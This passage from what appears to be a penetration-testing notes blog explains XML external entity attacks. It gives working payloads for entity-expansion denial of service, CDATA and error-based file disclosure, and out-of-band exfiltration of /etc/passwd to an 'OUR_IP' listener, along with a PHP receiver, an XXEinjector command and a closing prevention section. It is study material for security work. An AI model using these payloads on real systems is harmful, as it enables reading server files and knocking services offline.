+<span class="nt">&lt;name&gt;&lt;/name&gt;</span>
+<span class="nt">&lt;tel&gt;&lt;/tel&gt;</span>
+<span class="nt">&lt;email&gt;</span><span class="ni">&amp;company;</span><span class="nt">&lt;/email&gt;</span>
+<span class="nt">&lt;message&gt;&lt;/message&gt;</span>
+<span class="nt">&lt;/root&gt;</span>
+</pre></table></code></div></div><p>We replaced all spaces in the above XML code with <code class="language-plaintext highlighter-rouge">$IFS</code>.</p><h3 id="other-xxe-attacks"><span class="mr-2">Other XXE Attacks</span><a href="#other-xxe-attacks" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Another common attack often carried out through XXE vulnerabilities is SSRF exploitation, which is used to enumerate locally open ports and access their pages, among other restricted web pages, through the XXE vulnerability. One common use of XXE attacks is causing a Denial of Service (DOS) to the hosting web server, with the use the following payload:</p><div class="language-xml highlighter-rouge"><div class="code-header"> <span data-label-text="XML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+</pre><td class="rouge-code"><pre><span class="cp">&lt;?xml version="1.0"?&gt;</span>
+<span class="cp">&lt;!DOCTYPE email [
+  &lt;!ENTITY a0 "DOS" &gt;</span>
+  <span class="cp">&lt;!ENTITY a1 "&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;"&gt;</span>
+  <span class="cp">&lt;!ENTITY a2 "&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;"&gt;</span>
+  <span class="cp">&lt;!ENTITY a3 "&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;"&gt;</span>
+  <span class="cp">&lt;!ENTITY a4 "&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;"&gt;</span>
+  <span class="cp">&lt;!ENTITY a5 "&amp;a4;&amp;a4;&amp;a4;&amp;a4;&amp;a4;&amp;a4;&amp;a4;&amp;a4;&amp;a4;&amp;a4;"&gt;</span>
+  <span class="cp">&lt;!ENTITY a6 "&amp;a5;&amp;a5;&amp;a5;&amp;a5;&amp;a5;&amp;a5;&amp;a5;&amp;a5;&amp;a5;&amp;a5;"&gt;</span>
+  <span class="cp">&lt;!ENTITY a7 "&amp;a6;&amp;a6;&amp;a6;&amp;a6;&amp;a6;&amp;a6;&amp;a6;&amp;a6;&amp;a6;&amp;a6;"&gt;</span>
+  <span class="cp">&lt;!ENTITY a8 "&amp;a7;&amp;a7;&amp;a7;&amp;a7;&amp;a7;&amp;a7;&amp;a7;&amp;a7;&amp;a7;&amp;a7;"&gt;</span>
+  <span class="cp">&lt;!ENTITY a9 "&amp;a8;&amp;a8;&amp;a8;&amp;a8;&amp;a8;&amp;a8;&amp;a8;&amp;a8;&amp;a8;&amp;a8;"&gt;</span>        
+  <span class="cp">&lt;!ENTITY a10 "&amp;a9;&amp;a9;&amp;a9;&amp;a9;&amp;a9;&amp;a9;&amp;a9;&amp;a9;&amp;a9;&amp;a9;"&gt;</span>        
+]&gt;
+<span class="nt">&lt;root&gt;</span>
+<span class="nt">&lt;name&gt;&lt;/name&gt;</span>
+<span class="nt">&lt;tel&gt;&lt;/tel&gt;</span>
+<span class="nt">&lt;email&gt;</span><span class="ni">&amp;a10;</span><span class="nt">&lt;/email&gt;</span>
+<span class="nt">&lt;message&gt;&lt;/message&gt;</span>
+<span class="nt">&lt;/root&gt;</span>
+</pre></table></code></div></div><p>However, this attack no longer works with modern web servers, as they protect against entity self-reference.</p><h2 id="advanced-file-disclosure"><span class="mr-2">Advanced File Disclosure</span><a href="#advanced-file-disclosure" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Not all XXE vulnerabilities may be straightforward to exploit. Some file formats may not be readable through basic XXE, while in other cases, the web application may not output any input values in some instances, so we may try to force it through errors.</p><h3 id="advanced-exfiltration-with-cdata"><span class="mr-2">Advanced Exfiltration with CDATA</span><a href="#advanced-exfiltration-with-cdata" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>We can utilize another method to extract any kind of data (including binary data) for any web application backend, regardless of the language used. To output data that does not conform to the XML format, we can wrap the content of the external file reference with a <strong>CDATA</strong> tag ( <code class="language-plaintext highlighter-rouge">&lt;![CDATA[ FILE_CONTENT ]]&gt;</code>). This way, the XML parser would consider this part raw data, which may contain any type of data, including any special characters.</p><p>One easy way to tackle this issue would be to define a <strong>begin</strong> internal entity with <code class="language-plaintext highlighter-rouge">&lt;![CDATA[, an **end** internal entity with ]]&gt;</code>, and then place our external entity file in between, and it should be considered as a CDATA element, as follows:</p><div class="language-xml highlighter-rouge"><div class="code-header"> <span data-label-text="XML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre><td class="rouge-code"><pre><span class="cp">&lt;!DOCTYPE email [
+  &lt;!ENTITY begin "&lt;![CDATA["&gt;</span>
+  <span class="cp">&lt;!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php"&gt;</span>
+  <span class="cp">&lt;!ENTITY end "]]&gt;</span>"&gt;
+  <span class="cp">&lt;!ENTITY joined "&amp;begin;&amp;file;&amp;end;"&gt;</span>
+]&gt;
+</pre></table></code></div></div><p>After that, if we reference the <code class="language-plaintext highlighter-rouge">&amp;joined;</code> entity, it should contain our escaped data. However, this will not work, since XML prevents joining internal and external entities. To bypass this limitation, we can utilize XML Parameter Entities, a special type of entity that starts with a <code class="language-plaintext highlighter-rouge">%</code> character and can only be used within the DTD. What’s unique about parameter entities is that if we reference them from an external source, then all of them would be considered as external and can be joined, as follows:</p><div class="language-xml highlighter-rouge"><div class="code-header"> <span data-label-text="XML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="cp">&lt;!ENTITY joined "%begin;%file;%end;"&gt;</span>
+</pre></table></code></div></div><p>So, let’s try to read the submitDetails.php file by first storing the above line in a DTD file, host it on our machine, and then reference it as an external entity on the target web application, as follows:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre><span class="gp">zero@pio$</span><span class="w"> </span><span class="nb">echo</span> <span class="s1">'&lt;!ENTITY joined "%begin;%file;%end;"&gt;'</span> <span class="o">&gt;</span> xxe.dtd 
+<span class="gp">zero@pio$</span><span class="w"> </span>python3 <span class="nt">-m</span> http.server 8000
+</pre></table></code></div></div><p>Now, we can reference our external entity and then print the <code class="language-plaintext highlighter-rouge">&amp;joined;</code> entity we defined above, which should contain the content of the submitDetails.php file, as follows:</p><div class="language-xml highlighter-rouge"><div class="code-header"> <span data-label-text="XML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre><td class="rouge-code"><pre><span class="cp">&lt;!DOCTYPE email [
+  &lt;!ENTITY % begin "&lt;![CDATA["&gt;</span> <span class="c">&lt;!-- prepend the beginning of the CDATA tag --&gt;</span>
+  <span class="cp">&lt;!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"&gt;</span> <span class="c">&lt;!-- reference external file --&gt;</span>
+  <span class="cp">&lt;!ENTITY % end "]]&gt;</span>"&gt; <span class="c">&lt;!-- append the end of the CDATA tag --&gt;</span>
+  <span class="cp">&lt;!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"&gt;</span> <span class="c">&lt;!-- reference our external DTD --&gt;</span>
+  %xxe;
+]&gt;
+...
+<span class="nt">&lt;email&gt;</span><span class="ni">&amp;joined;</span><span class="nt">&lt;/email&gt;</span> <span class="c">&lt;!-- reference the &amp;joined; entity to print the file content --&gt;</span>
+</pre></table></code></div></div><blockquote class="prompt-alert"><div><p>In some modern web servers, we may not be able to read some files, as the web server would be preventing a DOS attack caused by file/entity self-reference (i.e., XML entity reference loop), as mentioned in the previous section.</p></div></blockquote><h3 id="error-based-xxe"><span class="mr-2">Error Based XXE</span><a href="#error-based-xxe" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Another situation we may find ourselves in is one where the web application might not write any output, so we cannot control any of the XML input entities to write its content. In such cases, we would be <strong>blind</strong> to the XML output and so would not be able to retrieve the file content using our usual methods. f the web application displays runtime errors and does not have proper exception handling for the XML input, then we can use this flaw to read the output of the XXE exploit.</p><p>First, let’s try to send malformed XML data, and see if the web application displays any errors. To do so, we can delete any of the closing tags, change one of them or just reference a non-existing entity. If it display an error we can exploit this flaw to exfiltrate file content. To do so, we will use a similar technique to what we used earlier. First, we will host a DTD file that contains the following payload:</p><div class="language-xml highlighter-rouge"><div class="code-header"> <span data-label-text="XML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre><span class="cp">&lt;!ENTITY % file SYSTEM "file:///etc/hosts"&gt;</span>
+<span class="cp">&lt;!ENTITY % error "&lt;!ENTITY content SYSTEM '%nonExistingEntity;/%file;'&gt;</span>"&gt;
+</pre></table></code></div></div><p>The above payload defines the file parameter entity and then joins it with an entity that does not exist. In our previous exercise, we were joining three strings. In this case, <code class="language-plaintext highlighter-rouge">%nonExistingEntity;</code> does not exist, so the web application would throw an error saying that this entity does not exist, along with our joined <code class="language-plaintext highlighter-rouge">%file;</code> as part of the error. There are many other variables that can cause an error, like a bad URI or having bad characters in the referenced file. Now, we can call our external DTD script, and then reference the error entity, as follows:</p><div class="language-xml highlighter-rouge"><div class="code-header"> <span data-label-text="XML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre><td class="rouge-code"><pre><span class="cp">&lt;!DOCTYPE email [ 
+  &lt;!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd"&gt;</span>
+  %remote;
+  %error;
+]&gt;
+</pre></table></code></div></div><p>However, this method is not as reliable as the previous method for reading source files, as it may have length limitations, and certain special characters may still break it.</p><h2 id="blind-data-exfiltration"><span class="mr-2">Blind Data Exfiltration</span><a href="#blind-data-exfiltration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="out-of-bound-data-exfiltration"><span class="mr-2">Out-of-bound Data Exfiltration</span><a href="#out-of-bound-data-exfiltration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>When we have no way to have anything printed on the web application response we can utilize a method known as <strong>Out-of-bound</strong> (<strong>OOB</strong>) <strong>Data Exfiltration</strong>, which is often used in similar blind cases with many web attacks, like blind SQL injections, blind command injections, blind XSS,… We will make the web application send a web request to our web server with the content of the file we are reading.</p><p>To do so, we can first use a parameter entity for the content of the file we are reading while utilizing PHP filter to base64 encode it. Then, we will create another external parameter entity and reference it to our IP, and place the file parameter value as part of the URL being requested over HTTP, as follows:</p><div class="language-xml highlighter-rouge"><div class="code-header"> <span data-label-text="XML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre><span class="cp">&lt;!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"&gt;</span>
+<span class="cp">&lt;!ENTITY % oob "&lt;!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'&gt;</span>"&gt;
+</pre></table></code></div></div><p>When the XML tries to reference the external oob parameter from our machine, it will request http://OUR_IP:8000/?content=WFhFX1NBTVBMRV9EQVRB. Finally, we can decode the WFhFX1NBTVBMRV9EQVRB string to get the content of the file. We can even write a simple PHP script that automatically detects the encoded file content, decodes it, and outputs it to the terminal:</p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
+<span class="k">if</span><span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'content'</span><span class="p">])){</span>
+    <span class="nb">error_log</span><span class="p">(</span><span class="s2">"</span><span class="se">\n\n</span><span class="s2">"</span> <span class="mf">.</span> <span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'content'</span><span class="p">]));</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span>
+</pre></table></code></div></div><p>In the same folder as the previous file (<strong>index.php</strong>):</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="gp">zero@pio$</span><span class="w"> </span>php <span class="nt">-S</span> 0.0.0.0:8000
+</pre></table></code></div></div><p>Now, to initiate our attack, we can use a similar payload to the one we used in the error-based attack, and simply add <root>&content;</root>, which is needed to reference our entity and have it send the request to our machine with the file content:</p><div class="language-xml highlighter-rouge"><div class="code-header"> <span data-label-text="XML"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre><td class="rouge-code"><pre><span class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
+<span class="cp">&lt;!DOCTYPE email [ 
+  &lt;!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd"&gt;</span>
+  %remote;
+  %oob;
+]&gt;
+<span class="nt">&lt;root&gt;</span><span class="ni">&amp;content;</span><span class="nt">&lt;/root&gt;</span>
+</pre></table></code></div></div><p>Send to the page and check the http open.</p><h3 id="automated-oob-exfiltration"><span class="mr-2">Automated OOB Exfiltration</span><a href="#automated-oob-exfiltration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>We can use <a href="https://github.com/enjoiz/XXEinjector">XXEinjector</a> to automatiza the explotation. This tool supports includes basic XXE, CDATA source exfiltration, error-based XXE, and blind OOB XXE. Copy the Burp request without the XML data, add <code class="language-plaintext highlighter-rouge">XXEINJECT</code>:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre><td class="rouge-code"><pre>&lt;HEADERS&gt;
+...
+
+&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+XXEINJECT
+</pre></table></code></div></div><p>Now run the tool:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="gp">zero@pio$</span><span class="w"> </span>ruby XXEinjector.rb <span class="nt">--host</span><span class="o">=</span>127.0.0.1 <span class="nt">--httpport</span><span class="o">=</span>8000 <span class="nt">--file</span><span class="o">=</span>/tmp/xxe.req <span class="nt">--path</span><span class="o">=</span>/etc/passwd <span class="nt">--oob</span><span class="o">=</span>http <span class="nt">--phpfilter</span>
+</pre></table></code></div></div><div class="table-wrapper"><table><thead><tr><th><strong>Flag</strong><th><strong>Description</strong><tbody><tr><td><code class="language-plaintext highlighter-rouge">--host=&lt;HOST&gt;</code><td>Select the host for the attack<tr><td><code class="language-plaintext highlighter-rouge">--httpport=&lt;PORT&gt;</code><td>Select our port for the attack<tr><td><code class="language-plaintext highlighter-rouge">--file=&lt;PATH&gt;</code><td>Request<tr><td><code class="language-plaintext highlighter-rouge">--path=&lt;PATH&gt;</code><td>File we want to read<tr><td><code class="language-plaintext highlighter-rouge">--oob=http</code> and <code class="language-plaintext highlighter-rouge">--phpfilter</code><td>Do a OOB attack</table></div><p>All exfiltrated files get stored in the <code class="language-plaintext filepath highlighter-rouge">Logs</code> folder under the tool.</p><h2 id="xxe-prevention"><span class="mr-2">XXE Prevention</span><a href="#xxe-prevention" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="avoiding-outdated-components"><span class="mr-2">Avoiding Outdated Components</span><a href="#avoiding-outdated-components" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>While other input validation web vulnerabilities are usually prevented through secure coding practices, this is not entirely necessary to prevent XXE vulnerabilities. This is because XML input is usually not handled manually by the web developers but by the built-in XML libraries instead. So, if a web application is vulnerable to XXE, this is very likely due to an outdated XML library that parses the XML data.</p><h3 id="using-safe-xml-configurations"><span class="mr-2">Using Safe XML Configurations</span><a href="#using-safe-xml-configurations" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Other than using the latest XML libraries, certain XML configurations for web applications can help reduce the possibility of XXE exploitation. These include:</p><ul><li>Disable referencing custom Document Type Definitions (DTDs)<li>Disable referencing External XML Entities<li>Disable Parameter Entity processing<li>Disable support for XInclude<li>Prevent Entity Reference Loops</ul><p>We should always have proper exception handling in our web applications and should always disable displaying runtime errors in web servers. With the various issues and vulnerabilities introduced by XML data, many also recommend using other formats, such as JSON or YAML. This also includes avoiding API standards that rely on XML (SOAP) and using JSON-based APIs instead (REST).</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/notes/'>Notes</a>, <a href='/categories/vulnerabilities/'>Vulnerabilities</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/xxe/" class="post-tag no-text-decoration" >xxe</a> <a href="/tags/idor/" class="post-tag no-text-decoration" >idor</a> <a href="/tags/tampering/" class="post-tag no-text-decoration" >tampering</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Notes+%7C+Web+Attacks+-+Zeropio%27s+Blog&url=zeropio.github.io%2Fnotes%2Fvulnerabilities%2Fweb-attacks" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Notes+%7C+Web+Attacks+-+Zeropio%27s+Blog&u=zeropio.github.io%2Fnotes%2Fvulnerabilities%2Fweb-attacks" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=zeropio.github.io%2Fnotes%2Fvulnerabilities%2Fweb-attacks&text=Notes+%7C+Web+Attacks+-+Zeropio%27s+Blog" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/notes/vulnerabilities/xss">Notes | Cross Site Scripting</a><li><a href="/notes/tools/commands">Notes | Commands</a><li><a href="/notes/vulnerabilities/session-security">Notes | Session Security</a><li><a href="/notes/vulnerabilities/others">Notes | Others</a><li><a href="/notes/vulnerabilities/server-side-attacks">Notes | Server Side Attacks</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/rootme/">rootme</a> <a class="post-tag" href="/tags/xss/">xss</a> <a class="post-tag" href="/tags/easy/">easy</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/bash/">bash</a> <a class="post-tag" href="/tags/crypto/">crypto</a> <a class="post-tag" href="/tags/tool/">tool</a> <a class="post-tag" href="/tags/veryeasy/">veryeasy</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/notes/vulnerabilities/others"><div class="card-body"> <em class="small" data-ts="1650837600" data-df="ll" > Apr 25, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Notes | Others</h3><div class="text-muted small"><p> ShellShock Attack This vulnerability in Bash allows remote code execution without confirmation. A series of random characters, () { :; }; , confuses Bash because it doesn’t know what to do with the...</p></div></div></a></div><div class="card"> <a href="/notes/web/services-api"><div class="card-body"> <em class="small" data-ts="1659477600" data-df="ll" > Aug 3, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Notes | Web Services and API Attacks</h3><div class="text-muted small"><p> Web services provide a standard means of interoperating between different software applications, running on a variety of platforms and/or frameworks. Web services are characterized by their great i...</p></div></div></a></div><div class="card"> <a href="/notes/vulnerabilities/sqli"><div class="card-body"> <em class="small" data-ts="1639263600" data-df="ll" > Dec 12, 2021 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Notes | SQLi</h3><div class="text-muted small"><p> A SQL injection occurs when a malicious user attempts to pass input that changes the final SQL query sent by the web application to the database, enabling the user to perform other unintended SQL q...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/notes/web/broken-auth" class="btn btn-outline-primary" prompt="Older"><p>Notes | Broken Authentication</p></a> <a href="/notes/web/services-api" class="btn btn-outline-primary" prompt="Newer"><p>Notes | Web Services and API Attacks</p></a></div></div></div><footer class="row pl-3 pr-3"><div class="col-12 d-flex justify-content-between align-items-center text-muted pl-0 pr-0"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/zeropiowastaken">zeropio</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/rootme/">rootme</a> <a class="post-tag" href="/tags/xss/">xss</a> <a class="post-tag" href="/tags/easy/">easy</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/bash/">bash</a> <a class="post-tag" href="/tags/crypto/">crypto</a> <a class="post-tag" href="/tags/tool/">tool</a> <a class="post-tag" href="/tags/veryeasy/">veryeasy</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3"></p><button type="button" class="btn btn-primary" aria-label="Update"> </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
